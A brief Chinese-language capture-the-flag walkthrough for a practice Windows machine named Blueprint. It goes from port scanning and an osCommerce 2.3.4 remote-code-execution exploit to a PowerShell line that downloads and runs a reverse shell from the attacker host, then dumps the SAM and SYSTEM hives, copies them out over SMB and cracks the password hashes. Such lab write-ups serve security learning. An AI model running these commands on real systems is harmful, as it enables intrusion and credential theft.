# Blueprint

入侵此 Windows 计算机并将您的权限升级为管理员

---

循例 nmap扫，主要开了这些端口：

    80/tcp    open  http
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    443/tcp   open  https
    445/tcp   open  microsoft-ds
    3306/tcp  open  mysql
    8080/tcp  open  http-proxy

进smb共享文件夹没啥东西，80进不去，8080和443都是同一个站点

web框架：oscommerce-2.3.4

    searchsploit oscommerce 2.3.4

有rce

直接用exp就能getshell

payload:

    powershell iex (New-Object Net.WebClient).DownloadString('http://10.14.39.48:8000/Invoke-PowershellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.14.39.48 -Port 8888

[Invoke-PowershellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

shell权限是system

root.txt在administrator的桌面下

### 转储sam、system

    reg save HKLM\sam sam
    reg save HKLM\system system

攻击机开启smbserver:

    python3 /usr/share/doc/python3-impacket/examples/smbserver.py hack .

上传文件到攻击机：

    copy sam \\10.14.39.48\hack
    copy system \\10.14.39.48\hack

攻击机使用python脚本读取

    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system ./system -sam ./sam LOCAL

将Lab用户这一行单拎出来用john爆破：

    john --wordlist=/usr/share/wordlists/rockyou.txt ./hash --format=NT

即可爆出明文密码

爆不出来也可以试试：https://crackstation.net/
